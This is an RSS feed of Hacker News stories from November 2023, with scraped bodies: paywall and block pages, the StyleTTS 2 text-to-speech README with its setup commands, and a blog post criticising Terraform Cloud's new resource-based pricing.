<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Sun, 19 Nov 2023 23:00:07 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[OpenAI negotiations to reinstate Altman hit snag over board role (105 pts)]]></title>
            <link>https://www.bloomberg.com/news/articles/2023-11-19/openai-negotiations-to-reinstate-altman-hit-snag-over-board-role</link>
            <guid>38337568</guid>
            <pubDate>Sun, 19 Nov 2023 20:35:09 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.bloomberg.com/news/articles/2023-11-19/openai-negotiations-to-reinstate-altman-hit-snag-over-board-role">https://www.bloomberg.com/news/articles/2023-11-19/openai-negotiations-to-reinstate-altman-hit-snag-over-board-role</a>, See on <a href="https://news.ycombinator.com/item?id=38337568">Hacker News</a></p>
<div id="readability-page-1" class="page"><section>
    <section>
        <h3>Why did this happen?</h3>
        <p>Please make sure your browser supports JavaScript and cookies and that you are not
            blocking them from loading.
            For more information you can review our <a href="https://www.bloomberg.com/notices/tos">Terms of
                Service</a> and <a href="https://www.bloomberg.com/notices/tos">Cookie Policy</a>.</p>
    </section>
    <section>
        <h3>Need Help?</h3>
        <p>For inquiries related to this message please <a href="https://www.bloomberg.com/feedback">contact
            our support team</a> and provide the reference ID below.</p>
        <p>Block reference ID:</p>
    </section>
</section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Gang crisis shaking Sweden (112 pts)]]></title>
            <link>https://www.ft.com/content/79f0d181-bdae-4c81-a971-861ccd8d512c</link>
            <guid>38336065</guid>
            <pubDate>Sun, 19 Nov 2023 18:37:45 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.ft.com/content/79f0d181-bdae-4c81-a971-861ccd8d512c">https://www.ft.com/content/79f0d181-bdae-4c81-a971-861ccd8d512c</a>, See on <a href="https://news.ycombinator.com/item?id=38336065">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="barrier-page">
<div data-o-grid-colspan="12 L6" data-component="articleBanner" data-component-unique-name="default"><p>Keep abreast of significant corporate, financial and political developments around the world. Stay informed and spot emerging risks and opportunities with independent global reporting, expert commentary and analysis you can trust.</p></div>
<div data-component="unlockBanner" data-component-unique-name="default"><p><img src="https://www.ft.com/__assets/creatives/optimizely/MAR090/key_icon.svg" alt=""><span id="text-unlockBanner-default">Subscribe to unlock this article</span></p></div>
<div data-theme="" data-component="heroOffer" data-component-unique-name="CHE-Print"><div data-o-grid-colspan="12"><p><h3>Try unlimited access</h3>
<h3><strong>Only CHF 1 for 4 weeks</strong></h3></p></div><div><div data-o-grid-colspan="12 M6"><ul>
<li>Then CHF 79 per month</li>
<li>New customers only</li>
<li>Cancel anytime during your trial</li>
</ul></div><div data-o-grid-colspan="12 M6"><p><a id="charge-button-CHE-Print" data-trackable="41218b9e-c8ae-c934-43ad-71b13fcb4465" href="https://www.ft.com/buy/offer/41218b9e-c8ae-c934-43ad-71b13fcb4465/"><span><p>Keep reading for CHF 1</p></span></a></p></div></div></div>
<p data-component="subscriptionOptionsHeader" data-component-unique-name="default"><h4 id="text-subscriptionOptionsHeader-default">Explore our subscriptions</h4></p>
<div data-component="subscriptionOptions" data-component-unique-name="CHE-Print"><div><h5 id="title-CHE-Print">Individual</h5><p>Find the plan that suits you best.</p><ul><li data-text="Digital"><a id="button1-CHE-Print" data-trackable="digital" href="https://subs.ft.com/digital_edit?ft-content-uuid=7da5d7e5-2c4d-4619-9c81-294d9a634ac4">Digital</a></li><li data-text="Print"><a id="button2-CHE-Print" data-trackable="print" href="https://subs.ft.com/spa3_uk3m?segmentId=461cfe95-f454-6e0b-9f7b-0800950bef25&amp;utm_us=JJIBAX&amp;utm_eu=WWIBEAX&amp;utm_ca=JJIBAZ&amp;utm_as=FIBAZ&amp;ft-content-uuid=7da5d7e5-2c4d-4619-9c81-294d9a634ac4">Print</a></li><li data-text="Print + Digital"><a id="button3-CHE-Print" data-trackable="digital-print" href="https://subs.ft.com/bundleoptions?segmentId=de88addc-8125-43ec-21f1-152c9886e67f&amp;utm_us=JJIBAX&amp;utm_eu=WWIBEAX&amp;utm_ca=JJIBAZ&amp;utm_as=FIBAZ">Print + Digital</a></li></ul></div></div>
<div data-component="subscriptionOptions" data-component-unique-name="default"><div><h5 id="title-default">Professional</h5><p>Premium access for businesses and educational institutions.</p><ul><li data-text="Get Started"><a id="button1-default" data-trackable="professional" href="https://professional.ft.com/en-gb/services/professional-subscriptions/?barrierName=anon_barrier&amp;ft-content-uuid=7da5d7e5-2c4d-4619-9c81-294d9a634ac4&amp;segmentId=9fbe4fe1-9315-3d67-cc6d-2bc7650c4aea">Get Started</a></li><li data-text=""><a id="button2-default" data-trackable="" href=""></a></li><li data-text=""><a id="button3-default" data-trackable="" href=""></a></li></ul><p>Check if your <a href="https://www.ft.com/licence-finder?segmentId=a0e9a794-4c6d-bb35-e4dc-8bd409e0f54f" data-trackable="edu-finder">university</a> or <a href="https://enterprise.ft.com/licence-finder?segmentId=9fb23d7d-afe4-12f3-3eaa-ff7a41e9d073" data-trackable="license-finder">organisation</a> offers FT membership to read for free.</p>
</div></div>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[A map of ATMs designed to scam tourists in Europe (126 pts)]]></title>
            <link>https://twitter.com/faborio/status/1725631676309463137</link>
            <guid>38335864</guid>
            <pubDate>Sun, 19 Nov 2023 18:23:43 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://twitter.com/faborio/status/1725631676309463137">https://twitter.com/faborio/status/1725631676309463137</a>, See on <a href="https://news.ycombinator.com/item?id=38335864">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="ScriptLoadFailure"><form action="" method="GET"><div><p><span>Something went wrong, but don’t fret — let’s give it another shot.</span></p><br></div></form></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Altman sought billions for AI chip venture before OpenAI ouster (304 pts)]]></title>
            <link>https://www.bloomberg.com/news/articles/2023-11-19/altman-sought-billions-for-ai-chip-venture-before-openai-ouster</link>
            <guid>38335525</guid>
            <pubDate>Sun, 19 Nov 2023 17:59:09 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.bloomberg.com/news/articles/2023-11-19/altman-sought-billions-for-ai-chip-venture-before-openai-ouster">https://www.bloomberg.com/news/articles/2023-11-19/altman-sought-billions-for-ai-chip-venture-before-openai-ouster</a>, See on <a href="https://news.ycombinator.com/item?id=38335525">Hacker News</a></p>
<div id="readability-page-1" class="page"><section>
    <section>
        <h3>Why did this happen?</h3>
        <p>Please make sure your browser supports JavaScript and cookies and that you are not
            blocking them from loading.
            For more information you can review our <a href="https://www.bloomberg.com/notices/tos">Terms of
                Service</a> and <a href="https://www.bloomberg.com/notices/tos">Cookie Policy</a>.</p>
    </section>
    <section>
        <h3>Need Help?</h3>
        <p>For inquiries related to this message please <a href="https://www.bloomberg.com/feedback">contact
            our support team</a> and provide the reference ID below.</p>
        <p>Block reference ID:</p>
    </section>
</section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[StyleTTS2 – open-source Eleven Labs quality Text To Speech (354 pts)]]></title>
            <link>https://github.com/yl4579/StyleTTS2</link>
            <guid>38335255</guid>
            <pubDate>Sun, 19 Nov 2023 17:40:33 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/yl4579/StyleTTS2">https://github.com/yl4579/StyleTTS2</a>, See on <a href="https://news.ycombinator.com/item?id=38335255">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text"><h2 tabindex="-1" dir="auto">StyleTTS 2: Towards Human-Level Text-to-Speech through Style Diffusion and Adversarial Training with Large Speech Language Models</h2>
<h3 tabindex="-1" dir="auto">Yinghao Aaron Li, Cong Han, Vinay S. Raghavan, Gavin Mischler, Nima Mesgarani</h3>
<blockquote>
<p dir="auto">In this paper, we present StyleTTS 2, a text-to-speech (TTS) model that leverages style diffusion and adversarial training with large speech language models (SLMs) to achieve human-level TTS synthesis. StyleTTS 2 differs from its predecessor by modeling styles as a latent random variable through diffusion models to generate the most suitable style for the text without requiring reference speech, achieving efficient latent diffusion while benefiting from the diverse speech synthesis offered by diffusion models. Furthermore, we employ large pre-trained SLMs, such as WavLM, as discriminators with our novel differentiable duration modeling for end-to-end training, resulting in improved speech naturalness. StyleTTS 2 surpasses human recordings on the single-speaker LJSpeech dataset and matches it on the multispeaker VCTK dataset as judged by native English speakers. Moreover, when trained on the LibriTTS dataset, our model outperforms previous publicly available models for zero-shot speaker adaptation. This work achieves the first human-level TTS synthesis on both single and multispeaker datasets, showcasing the potential of style diffusion and adversarial training with large SLMs.</p>
</blockquote>
<p dir="auto">Paper: <a href="https://arxiv.org/abs/2306.07691" rel="nofollow">https://arxiv.org/abs/2306.07691</a></p>
<p dir="auto">Audio samples: <a href="https://styletts2.github.io/" rel="nofollow">https://styletts2.github.io/</a></p>
<p dir="auto"><a href="https://colab.research.google.com/github/yl4579/StyleTTS2/blob/main/" rel="nofollow"><img src="https://camo.githubusercontent.com/84f0493939e0c4de4e6dbe113251b4bfb5353e57134ffd9fcab6b8714514d4d1/68747470733a2f2f636f6c61622e72657365617263682e676f6f676c652e636f6d2f6173736574732f636f6c61622d62616467652e737667" alt="Open In Colab" data-canonical-src="https://colab.research.google.com/assets/colab-badge.svg"></a></p>
<h2 tabindex="-1" dir="auto">TODO</h2>
<ul>
<li> Training and inference demo code for single-speaker models (LJSpeech)</li>
<li> Test training code for multi-speaker models (VCTK and LibriTTS)</li>
<li> Finish demo code for multispeaker model and upload pre-trained models</li>
<li> Add a finetuning script for new speakers with base pre-trained multispeaker models</li>
<li> Fix DDP (accelerator) for <code>train_second.py</code> <strong>(I have tried everything I could to fix this but had no success, so if you are willing to help, please see <a href="https://github.com/yl4579/StyleTTS2/issues/7" data-hovercard-type="issue" data-hovercard-url="/yl4579/StyleTTS2/issues/7/hovercard">#7</a>)</strong></li>
</ul>
<h2 tabindex="-1" dir="auto">Pre-requisites</h2>
<ol dir="auto">
<li>Python &gt;= 3.7</li>
<li>Clone this repository:</li>
</ol>
<div dir="auto" data-snippet-clipboard-copy-content="git clone https://github.com/yl4579/StyleTTS2.git
cd StyleTTS2"><pre>git clone https://github.com/yl4579/StyleTTS2.git
<span>cd</span> StyleTTS2</pre></div>
<ol start="3" dir="auto">
<li>Install python requirements:</li>
</ol>
<div dir="auto" data-snippet-clipboard-copy-content="pip install -r requirements.txt"><pre>pip install -r requirements.txt</pre></div>
<p dir="auto">On Windows add:</p>
<div dir="auto" data-snippet-clipboard-copy-content="pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu118 -U"><pre>pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu118 -U</pre></div>
<p dir="auto">Also install phonemizer and espeak if you want to run the demo:</p>
<div dir="auto" data-snippet-clipboard-copy-content="pip install phonemizer
sudo apt-get install espeak-ng"><pre>pip install phonemizer
sudo apt-get install espeak-ng</pre></div>
<ol start="4" dir="auto">
<li>Download and extract the <a href="https://keithito.com/LJ-Speech-Dataset/" rel="nofollow">LJSpeech dataset</a>, unzip to the data folder and upsample the data to 24 kHz. The text aligner and pitch extractor are pre-trained on 24 kHz data, but you can easily change the preprocessing and re-train them using your own preprocessing.
For LibriTTS, you will need to combine train-clean-360 with train-clean-100 and rename the folder train-clean-460 (see <a href="https://github.com/yl4579/StyleTTS/blob/main/Data/val_list_libritts.txt">val_list_libritts.txt</a> as an example).</li>
</ol>
<h2 tabindex="-1" dir="auto">Training</h2>
<p dir="auto">First stage training:</p>
<div dir="auto" data-snippet-clipboard-copy-content="accelerate launch train_first.py --config_path ./Configs/config.yml"><pre>accelerate launch train_first.py --config_path ./Configs/config.yml</pre></div>
<p dir="auto">Second stage training <strong>(DDP version not working, so the current version uses DP, again see <a href="https://github.com/yl4579/StyleTTS2/issues/7" data-hovercard-type="issue" data-hovercard-url="/yl4579/StyleTTS2/issues/7/hovercard">#7</a> if you want to help)</strong>:</p>
<div dir="auto" data-snippet-clipboard-copy-content="python train_second.py --config_path ./Configs/config.yml"><pre>python train_second.py --config_path ./Configs/config.yml</pre></div>
<p dir="auto">You can run both consecutively and it will train both the first and second stages. The model will be saved in the format "epoch_1st_%05d.pth" and "epoch_2nd_%05d.pth". Checkpoints and Tensorboard logs will be saved at <code>log_dir</code>.</p>
<p dir="auto">The data list format needs to be <code>filename.wav|transcription|speaker</code>, see <a href="https://github.com/yl4579/StyleTTS2/blob/main/Data/val_list.txt">val_list.txt</a> as an example. The speaker labels are needed for multi-speaker models because we need to sample reference audio for style diffusion model training.</p>
<h3 tabindex="-1" dir="auto">Important Configurations</h3>
<p dir="auto">In <a href="https://github.com/yl4579/StyleTTS2/blob/main/Configs/config.yml">config.yml</a>, there are a few important configurations to take care of:</p>
<ul dir="auto">
<li><code>OOD_data</code>: The path for out-of-distribution texts for SLM adversarial training. The format should be <code>text|anything</code>.</li>
<li><code>min_length</code>: Minimum length of OOD texts for training. This is to make sure the synthesized speech has a minimum length.</li>
<li><code>max_len</code>: Maximum length of audio for training. The unit is frame. Since the default hop size is 300, one frame is approximately <code>300 / 24000</code> (0.125) second. Lowering this if you encounter the out-of-memory issue.</li>
<li><code>multispeaker</code>: Set to true if you want to train a multispeaker model. This is needed because the architecture of the denoiser is different for single and multispeaker models.</li>
<li><code>batch_percentage</code>: This is to make sure during SLM adversarial training there are no out-of-memory (OOM) issues. If you encounter OOM problem, please set a lower number for this.</li>
</ul>
<h3 tabindex="-1" dir="auto">Pre-trained modules</h3>
<p dir="auto">In <a href="https://github.com/yl4579/StyleTTS2/tree/main/Utils">Utils</a> folder, there are three pre-trained models:</p>
<ul dir="auto">
<li><strong><a href="https://github.com/yl4579/StyleTTS2/tree/main/Utils/ASR">ASR</a> folder</strong>: It contains the pre-trained text aligner, which was pre-trained on English (LibriTTS), Japanese (JVS), and Chinese (AiShell) corpus. It works well for most other languages without fine-tuning, but you can always train your own text aligner with the code here: <a href="https://github.com/yl4579/AuxiliaryASR">yl4579/AuxiliaryASR</a>.</li>
<li><strong><a href="https://github.com/yl4579/StyleTTS2/tree/main/Utils/JDC">JDC</a> folder</strong>: It contains the pre-trained pitch extractor, which was pre-trained on English (LibriTTS) corpus only. However, it works well for other languages too because F0 is independent of language. If you want to train on singing corpus, it is recommended to train a new pitch extractor with the code here: <a href="https://github.com/yl4579/PitchExtractor">yl4579/PitchExtractor</a>.</li>
<li><strong><a href="https://github.com/yl4579/StyleTTS2/tree/main/Utils/PLBERT">PLBERT</a> folder</strong>: It contains the pre-trained <a href="https://arxiv.org/abs/2301.08810" rel="nofollow">PL-BERT</a> model, which was pre-trained on English (Wikipedia) corpus only. It probably does not work very well on other languages, so you will need to train a different PL-BERT for different languages using the repo here: <a href="https://github.com/yl4579/PL-BERT">yl4579/PL-BERT</a>. You can also replace this module with other phoneme BERT models like <a href="https://arxiv.org/abs/2305.19709" rel="nofollow">XPhoneBERT</a> which is pre-trained on more than 100 languages.</li>
</ul>
<h3 tabindex="-1" dir="auto">Common Issues</h3>
<ul dir="auto">
<li><strong>Loss becomes NaN</strong>: If it is the first stage, please make sure you do not use mixed precision, as it can cause loss becoming NaN for some particular datasets when the batch size is not set properly (need to be more than 16 to work well). For the second stage, please also experiment with different batch sizes, with higher batch sizes being more likely to cause NaN loss values. We recommend the batch size to be 16. You can refer to issues <a href="https://github.com/yl4579/StyleTTS2/issues/10" data-hovercard-type="issue" data-hovercard-url="/yl4579/StyleTTS2/issues/10/hovercard">#10</a> and <a href="https://github.com/yl4579/StyleTTS2/issues/11" data-hovercard-type="issue" data-hovercard-url="/yl4579/StyleTTS2/issues/11/hovercard">#11</a> for more details.</li>
<li><strong>Out of memory</strong>: Please either use lower <code>batch_size</code> or <code>max_len</code>. You may refer to issue <a href="https://github.com/yl4579/StyleTTS2/issues/10" data-hovercard-type="issue" data-hovercard-url="/yl4579/StyleTTS2/issues/10/hovercard">#10</a> for more information.</li>
</ul>
<h2 tabindex="-1" dir="auto">Finetuning</h2>
<p dir="auto">The script is modified from <code>train_second.py</code> which uses DP, as DDP does not work for <code>train_second.py</code>. Please see the bold section above if you are willing to help with this problem.</p>
<div dir="auto" data-snippet-clipboard-copy-content="python train_finetune.py --config_path ./Configs/config_ft.yml"><pre>python train_finetune.py --config_path ./Configs/config_ft.yml</pre></div>
<p dir="auto">Please make sure you have the LibriTTS checkpoint downloaded and unzipped under the folder. The default configuration <code>config_ft.yml</code> finetunes on LJSpeech with 1 hour of speech data (around 1k samples) for 50 epochs. This took about 4 hours to finish on four NVidia A100. The quality is slightly worse (similar to NaturalSpeech on LJSpeech) than LJSpeech model trained from scratch with 24 hours of speech data, which took around 2.5 days to finish on four A100.</p>
<p dir="auto"><a href="https://colab.research.google.com/github/yl4579/StyleTTS2/blob/main/Colab/StyleTTS2_Finetune_Demo.ipynb" rel="nofollow"><img src="https://camo.githubusercontent.com/84f0493939e0c4de4e6dbe113251b4bfb5353e57134ffd9fcab6b8714514d4d1/68747470733a2f2f636f6c61622e72657365617263682e676f6f676c652e636f6d2f6173736574732f636f6c61622d62616467652e737667" alt="Open In Colab" data-canonical-src="https://colab.research.google.com/assets/colab-badge.svg"></a></p>
<h2 tabindex="-1" dir="auto">Inference</h2>
<p dir="auto">Please refer to <a href="https://github.com/yl4579/StyleTTS2/blob/main/Demo/Inference_LJSpeech.ipynb">Inference_LJSpeech.ipynb</a> (single-speaker) and <a href="https://github.com/yl4579/StyleTTS2/blob/main/Demo/Inference_LibriTTS.ipynb">Inference_LibriTTS.ipynb</a> (multi-speaker) for details. For LibriTTS, you will also need to download <a href="https://drive.google.com/file/d/1YhQO4O4dAsvkMzWZM8nVFMglYyi554YT" rel="nofollow">reference_audio.zip</a> and unzip it under the <code>demo</code> before running the demo.</p>
<ul dir="auto">
<li>
<p dir="auto">The pretrained StyleTTS 2 on LJSpeech corpus in 24 kHz can be downloaded at <a href="https://drive.google.com/file/d/1K3jt1JEbtohBLUA0X75KLw36TW7U1yxq/view?usp=sharing" rel="nofollow">StyleTTS 2 LJSpeech Link</a>.</p>
<p dir="auto"><a href="https://colab.research.google.com/github/yl4579/StyleTTS2/blob/main/Colab/StyleTTS2_Demo_LJSpeech.ipynb" rel="nofollow"><img src="https://camo.githubusercontent.com/84f0493939e0c4de4e6dbe113251b4bfb5353e57134ffd9fcab6b8714514d4d1/68747470733a2f2f636f6c61622e72657365617263682e676f6f676c652e636f6d2f6173736574732f636f6c61622d62616467652e737667" alt="Open In Colab" data-canonical-src="https://colab.research.google.com/assets/colab-badge.svg"></a></p>
</li>
<li>
<p dir="auto">The pretrained StyleTTS 2 model on LibriTTS can be downloaded at <a href="https://drive.google.com/file/d/1jK_VV3TnGM9dkrIMsdQ_upov8FrIymr7/view" rel="nofollow">StyleTTS 2 LibriTTS Link</a>.</p>
<p dir="auto"><a href="https://colab.research.google.com/github/yl4579/StyleTTS2/blob/main/Colab/StyleTTS2_Demo_LibriTTS.ipynb" rel="nofollow"><img src="https://camo.githubusercontent.com/84f0493939e0c4de4e6dbe113251b4bfb5353e57134ffd9fcab6b8714514d4d1/68747470733a2f2f636f6c61622e72657365617263682e676f6f676c652e636f6d2f6173736574732f636f6c61622d62616467652e737667" alt="Open In Colab" data-canonical-src="https://colab.research.google.com/assets/colab-badge.svg"></a></p>
</li>
</ul>
<p dir="auto"><em><strong>Before using these models, you agree to inform the listeners that the speech samples are synthesized by StyleTTS 2 models, unless you have the permission to use the voice you synthesize. That is, when using it for voice cloning, you also agree to only use voices whose speakers grant the permission to have their voice cloned, either directly or by license before making synthesized voices pubilc.</strong></em></p>
<h3 tabindex="-1" dir="auto">Common Issues</h3>
<ul dir="auto">
<li><strong>High-pitched background noise</strong>: This is caused by numerical float differences in older GPUs. For more details, please refer to issue <a href="https://github.com/yl4579/StyleTTS2/issues/13" data-hovercard-type="issue" data-hovercard-url="/yl4579/StyleTTS2/issues/13/hovercard">#13</a>. Basically, you will need to use more modern GPUs or do inference on CPUs.</li>
</ul>
<h2 tabindex="-1" dir="auto">References</h2>
<ul dir="auto">
<li><a href="https://github.com/archinetai/audio-diffusion-pytorch">archinetai/audio-diffusion-pytorch</a></li>
<li><a href="https://github.com/jik876/hifi-gan">jik876/hifi-gan</a></li>
<li><a href="https://github.com/rishikksh20/iSTFTNet-pytorch">rishikksh20/iSTFTNet-pytorch</a></li>
<li><a href="https://github.com/nii-yamagishilab/project-NN-Pytorch-scripts/tree/master/project/01-nsf">nii-yamagishilab/project-NN-Pytorch-scripts/project/01-nsf</a></li>
</ul>
</article>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[From airlines to ticket sellers, companies fight U.S. to keep junk fees (133 pts)]]></title>
            <link>https://www.washingtonpost.com/business/2023/11/19/companies-lobbyists-fight-junk-fees/</link>
            <guid>38334126</guid>
            <pubDate>Sun, 19 Nov 2023 16:25:06 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.washingtonpost.com/business/2023/11/19/companies-lobbyists-fight-junk-fees/">https://www.washingtonpost.com/business/2023/11/19/companies-lobbyists-fight-junk-fees/</a>, See on <a href="https://news.ycombinator.com/item?id=38334126">Hacker News</a></p>
Couldn't get https://www.washingtonpost.com/business/2023/11/19/companies-lobbyists-fight-junk-fees/: Error: timeout of 10000ms exceeded]]></description>
        </item>
        <item>
            <title><![CDATA[Terraform Cloud Pricing Changes Sticker Shock (221 pts)]]></title>
            <link>https://shavingtheyak.com/2023/10/28/hashicorps-terraform-cloud-rum-pricing-sticker-shock/</link>
            <guid>38334102</guid>
            <pubDate>Sun, 19 Nov 2023 16:23:27 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://shavingtheyak.com/2023/10/28/hashicorps-terraform-cloud-rum-pricing-sticker-shock/">https://shavingtheyak.com/2023/10/28/hashicorps-terraform-cloud-rum-pricing-sticker-shock/</a>, See on <a href="https://news.ycombinator.com/item?id=38334102">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemprop="text">

<figure><img decoding="async" fetchpriority="high" width="1024" height="585" src="https://shavingtheyak.com/wp-content/uploads/2023/11/tfbridge1-1-1024x585.png" alt="" srcset="https://shavingtheyak.com/wp-content/uploads/2023/11/tfbridge1-1-1024x585.png 1024w, https://shavingtheyak.com/wp-content/uploads/2023/11/tfbridge1-1-300x172.png 300w, https://shavingtheyak.com/wp-content/uploads/2023/11/tfbridge1-1-768x439.png 768w, https://shavingtheyak.com/wp-content/uploads/2023/11/tfbridge1-1-850x486.png 850w, https://shavingtheyak.com/wp-content/uploads/2023/11/tfbridge1-1.png 1165w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>
<p>Terraform Cloud is convenient, especially when you have many teams, microservices and projects all needing their own infrastructure as code (IAC) along with SSO regulated access control and the need to run IAC from certain locations inside protected private networks. While Terraform itself can be annoying and difficult at times, it is still the leading tool for many IAC use-cases. Once you get beyond a small amount of IAC, and it starts to become used in a democratized way across your organization, the need to structure and monitor its use becomes important, especially for answering those pesky ‘who has access to X’ questions from compliance and security.</p>
<p>I used to work on a team where we were the only people using Terraform, and we all just ran it on a single server, switching to the same user to run things. Every once in a while we would ping in slack ‘hey who is running an apply – can I kill your lock?’ – This gets old fast, but in a small setup with the state file in a safe place like S3 with versioning, it runs just fine. It is also ‘free’. I put the word free in quotes here as a reminder that almost every open source project you can use has a cost, in time and headaches, that hopefully you aren’t dealing with if you pay a vendor for the same service. In the case of Terraform Cloud however, you still have the same issues you run into when using Terraform for ‘free’, but you get to share those issues easily with everyone in your org by pasting your run link in slack and praying that somehow, someone else has run into the same issues you have and can decipher the cryptic error messages on your screen.</p>
<p>Enter the SAAS business model. Now I’m generally a proponent of managed services that save time, as I personally don’t want to spend all my time troubleshooting the kubernetes control plane, or figuring out what caused a mongo cluster to get hours behind on replication in prod. I like to get things done, help people solve their problems and generally help make things better for the business and better for the people I interact with every day. Sure it can be fun to solve a pesky networking issue that has been plaguing your cluster for months, but there’s something to be said for having a hand in getting something new rolled out, whether it is a feature for the customers or a feature/automation that helps the internal org move faster. One of the biggest parts of being engaged is believing that the work you do ‘matters’. Managed services can help out on this front, to a degree.</p>
<figure><img decoding="async" width="1024" height="277" src="https://shavingtheyak.com/wp-content/uploads/2023/11/eaas1-Copy-1024x277.png" alt="" srcset="https://shavingtheyak.com/wp-content/uploads/2023/11/eaas1-Copy-1024x277.png 1024w, https://shavingtheyak.com/wp-content/uploads/2023/11/eaas1-Copy-300x81.png 300w, https://shavingtheyak.com/wp-content/uploads/2023/11/eaas1-Copy-768x208.png 768w, https://shavingtheyak.com/wp-content/uploads/2023/11/eaas1-Copy-850x230.png 850w, https://shavingtheyak.com/wp-content/uploads/2023/11/eaas1-Copy.png 1117w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>
<p>Now Terraform Cloud is generally a solid product. We use it constantly, and according to something I saw recently from our rep we are managing &gt; 35K ‘resources’ with it. This can be a bit misleading, as what that number means in reality is ‘resource blocks’ of Terraform code referenced in corresponding state files. Some physical/real infrastructure resources will use up more than one resource block of code. In the current version of the AWS provider for example, a single S3 bucket can end up being more than 10 different blocks of ‘resources’ due to different aspects of the bucket configuration being defined by each resource type.</p>
<p>The downside of managed services, of course, is possible lock-in, and unexpected changes to pricing or to the product itself. From my understanding Hashicorp is generally full of brilliant folks, and I’m sure that they noticed that a number of companies were using Terraform Cloud (TFC) to manage a ton of resources and had only a few users. In a user-based pricing model this makes sense, but for most companies who ‘need’ to use a product like TFC they need it to manage the IAC runs and access of their developer user base. We currently have ~500 workspaces and hundreds of users in many teams managed automatically through our SSO provider. So TFC for us was already on the ‘expensive’ list. You know the list I’m talking about right? The one that gets passed around every year or every quarter where you hear grumbling from upper management about costs, and you aren’t sure if a vendor contract will be renewed again this time? Generally after a few meetings defending the use of the product and the costs, things settle down again and you wait for the same thing to happen again a year later.</p>
<p>So without any warning we discover that our contract will suddenly go from being the current user-based pricing to their new ‘Resources Under Management’ (RUM) pricing model. I’m sure for some people there isn’t much of a difference, but for for us the costs balloon to over 3x the current costs. This moves our usage of TFC from the ‘expensive but necessary’ list to ‘next year’s migration project’ list. Immediately. Looking around online for other people’s reactions turns up a few amusing things:</p>
<ul>
<li>Reddit thread: One user comment stands out the most to me here: “<em><strong>The pricing on Terraform literally just jumped to almost same as we are paying for the AWS resources it manages.</strong></em>” <a href="https://www.reddit.com/r/Terraform/comments/13jgzc5/terraform_new_pricing/" target="_blank" rel="noreferrer noopener">https://www.reddit.com/r/Terraform/comments/13jgzc5/terraform_new_pricing/</a></li>
</ul>
<ul>
<li>Medium: “<em><strong>The fundamental problem seems to be that the pricing model is okay for small and medium businesses who are just starting off, but it just does not scale.</strong></em>” – <a href="https://medium.com/@DiggerHQ/navigate-terraform-clouds-updated-pricing-strategy-by-moving-to-these-alternatives-84cde063ec3" target="_blank" rel="noreferrer noopener">https://medium.com/@DiggerHQ/navigate-terraform-clouds-updated-pricing-strategy-by-moving-to-these-alternatives-84cde063ec3</a></li>
</ul>
<figure><img decoding="async" width="1024" height="585" src="https://shavingtheyak.com/wp-content/uploads/2023/11/rugpull1-1024x585.png" alt="" srcset="https://shavingtheyak.com/wp-content/uploads/2023/11/rugpull1-1024x585.png 1024w, https://shavingtheyak.com/wp-content/uploads/2023/11/rugpull1-300x171.png 300w, https://shavingtheyak.com/wp-content/uploads/2023/11/rugpull1-768x439.png 768w, https://shavingtheyak.com/wp-content/uploads/2023/11/rugpull1-1536x878.png 1536w, https://shavingtheyak.com/wp-content/uploads/2023/11/rugpull1-850x486.png 850w, https://shavingtheyak.com/wp-content/uploads/2023/11/rugpull1.png 1792w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>
<p>Now I’m all for the freedom of companies to price their products in a way that enables them to prosper, but changing pricing models on an existing customer base that has to spend significant money and time to move to other, cheaper products tends to leave a bad taste in my mouth. Remember the Unity game engine fiasco recently? Look it up. Things didn’t go well when some folks realized the new pricing would put them out of business. Not a fair comparison at all to our TFC pricing change here, but it’s an example of something that seems to happen over and over nowadays. Someone starts a business, gets a ton of subscribers and a large chunk of market share and then changes their pricing model once they feel secure enough in doing so. This is the sort of thing I worry about with vendors, especially ones like AWS. I also cannot be the only person who keeps swearing off using Uber and Lyft after discovering their pricing model now makes taxis seem cheap at times.</p>
<p>Another tactic being used in our TFC pricing model change here is the ‘<strong>get them in the door cheap on a pricing model that will never decrease</strong>‘ idea.</p>
<p>Lets unpack this a bit. Why does it matter that the pricing went from user-based to resources based? I’ll tell you why. <strong>You will almost never get rid of more IAC code in a month than you add unless the sky is falling.</strong> Lets say you already have a bunch of infra and you want it all managed with IAC. Each month you will be adding more and more resources to your list of things managed using TFC. Lets say you are a small company just starting out. The first 500 resources are free. You start to add some IAC to your TFC account and pretty soon you are up to thousands of ‘resources’. This in itself isn’t much, but if you continue to grow it gets to be pricey. The hope is that larger companies with many users will get pulled in by the super low starting costs, and after a bunch of users all doing their job start to add a bunch of code individually the pricing will just keep going up and up and up over time.</p>
<p>This won’t happen in a vacuum, however. Companies will be forced to become picky about what they use IAC for, which in some ways goes counter to the reason you started to use IAC in the first place. Remember all those complicated setups in AWS that used to be fully configured via code? Now you will be spending hours on an incident call trying to figure out why one of them stopped working. Or worse, you will start using CloudFormation. (Hey that’s a disturbing idea – I can reduce the number of resources I use in TFC by just deploying CloudFormation using Terraform)</p>
